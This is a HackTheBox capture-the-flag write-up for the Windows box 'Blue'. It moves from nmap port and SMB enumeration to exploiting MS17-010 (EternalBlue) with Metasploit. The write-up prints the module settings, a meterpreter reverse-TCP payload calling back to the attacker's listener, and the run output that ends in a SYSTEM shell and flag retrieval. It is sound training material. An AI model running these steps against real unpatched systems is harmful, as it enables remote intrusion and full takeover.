# Blue
**Blue** is an easy HackTheBox Windows box. Its simplicity lies in an SMBv1 service, vulnerable to the [EternalBlue](https://nordvpn.com/blog/what-is-eternalblue/) exploit. 

## Enumerating ports
Because of my impatience I typically conduct 2 scans:
* quick scan, which gives me initial info about the ports open on the machine
* version scan, which informs me of the versions of software on the machine

### Pinging for confirmation
After spawning the machine I pinged it first to confirm it being accessible on the network:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ ping -c 5 $IP
PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=113 ms
64 bytes from 10.10.10.40: icmp_seq=2 ttl=127 time=121 ms
64 bytes from 10.10.10.40: icmp_seq=3 ttl=127 time=191 ms
64 bytes from 10.10.10.40: icmp_seq=4 ttl=127 time=176 ms
64 bytes from 10.10.10.40: icmp_seq=5 ttl=127 time=188 ms

--- 10.10.10.40 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4002ms
rtt min/avg/max/mdev = 112.942/157.924/191.158/33.790 ms
```

### Scanning

First I fished for open ports:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ sudo nmap -sS -T5 -O -oN scan-quick.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 05:50 EST
Nmap scan report for 10.10.10.40
Host is up (0.11s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
```


With this initial information I did a more thorough scan:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ sudo nmap -sS -T5 -sV -sC -p 135,139,445,49152,49153,49154,49155,49156,49157 -oN scan-version.txt $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:00 EST
Nmap scan report for 10.10.10.40
Host is up (0.20s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled but not required
|_clock-skew: mean: 4s, deviation: 2s, median: 2s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-01-31T11:01:18+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-01-31T11:01:19
|_  start_date: 2025-01-31T10:47:07

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 74.79 seconds
```

[msrpc](https://superuser.com/questions/616098/what-is-rpc-and-why-is-it-so-important) - Microsoft Windows RPC, this service is largely not so important to me as it is not really used to host anything. To my mind, MS Windows RPC is a service that allows applications on the Windows machine to communicate with eachother. While RPC can also be used to send commands to the machine, which would warrant a code execution check, I had my money on the other services present.

[netbios-ssn](https://medium.com/@chavanyashwardhan/difference-between-netbios-smb-1cd74ec02fdd) - From my understanding, it is a windows service that allows another machine to connect to the one running it. It gives every computer a NetBIOS name similar to their hostname(here HARIS-PC\x00). With NetBIOS, a computer can refer to a target computer via its NetBIOS name, which by resultion is translated into an IP address. This can also host an SMB service as _SMB over NetBIOS_.

[microsoft-ds](https://en.wikipedia.org/wiki/Server_Message_Block) - this is an SMB service that allows sharing files on the network. Seeing this service on 445 means SMB can be run _over TCP/IP_ directly also.

From the scans I gathered the following:
* there is no firewall present (quick scann detected closed ports)
* OS: Windows 7 SP 1
* hostname:"haris-PC"
* SMB file sharing is enabled on the system

## Enumerating SMB
I predicted the SMB server would be the most important thing to test, so I tested it first.

I scanned the _SMB over TCP/IP_ for the version of SMB on the machine:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nmap -p 445 --script smb-protocols $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:13 EST
Nmap scan report for 10.10.10.40
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0

Nmap done: 1 IP address (1 host up) scanned in 4.82 seconds
```

Seeing SMBv1, I immediately remebered the [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) exploit this version might be suseptible to.
This would also line up with the OS version, as [the Microsoft Bulletin covering EternalBlue](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010) deems similar if not identical versions of windows to be vulnerable.
I ran another nmap scan, this time check if this vulnerability is exploitable here:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nmap -p 445 --script smb-vuln-ms17-010 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-31 06:16 EST
Nmap scan report for 10.10.10.40
Host is up (0.23s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 2.99 seconds
```

The machine is vulnerable!

## Exploiting EternalBlue via Metasploit (smh)
Being stuck on this box for a while, I hadn't got the time nor luck finding a script exploiting this vulnerability that is easy to use. For now I opt for using Metasploit, hoping to go back someday and pwn the machine without it.

With the help of [this tutorial](https://shreybs.github.io/EternalBlue/) I used Metasploit to execute EternalBlue:

I first initialized Metasploit:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ msfconsole
Metasploit tip: Set the current module's RHOSTS with database values using
hosts -R or services -R

  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v6.4.44-dev                          ]
+ -- --=[ 2487 exploits - 1281 auxiliary - 431 post       ]
+ -- --=[ 1466 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 >
```

I then searched for a vulnerability through the name of the aforementioned Microsoft Bulletin:

```bash
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue
SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant                .                .        .      .


Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```

I picked the first result.

Default options:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                             oit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Changing options:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.19
LHOST => 10.10.14.19
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 1234
LPORT => 1234
```

Changed options:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.10.40      yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                             oit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7
target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.19      yes       The listen address (an interface may be specified)
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```
I executed the script:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.14.19:1234
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.19:1234 -> 10.10.10.40:49158) at 2025-01-31 07:42:10 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

I then switched the shell to a cmd windows shell:

```bash
meterpreter > shell
Process 2308 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

Running `whoami` revealed that I am already `system` (windows version of Linux's `root`):

```bash
C:\Windows\system32>whoami
whoami
nt authority\system
```

Getting the was now trivial with the following commands:

```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
```


### ASIDE - dumb nc mistake
Being unfamiliar with Metasploit, I thought that I needed to setup a nc listener for the reverse shell. This is wrong, as Metasploit will try to set it up itself.

When I created a nc listener:

```bash
(sz3kz@kali)~{tun0:10.10.14.19}~[Blue]$ nc -lvnp 1234
listening on [any] 1234 ...

```

And tried to execute the script I got an error:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[-] Handler failed to bind to 10.10.14.19:1234:-  -
[-] Handler failed to bind to 0.0.0.0:1234:-  -
[-] 10.10.10.40:445 - Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:1234).
[*] Exploit completed, but no session was created.
```

_The more I know_
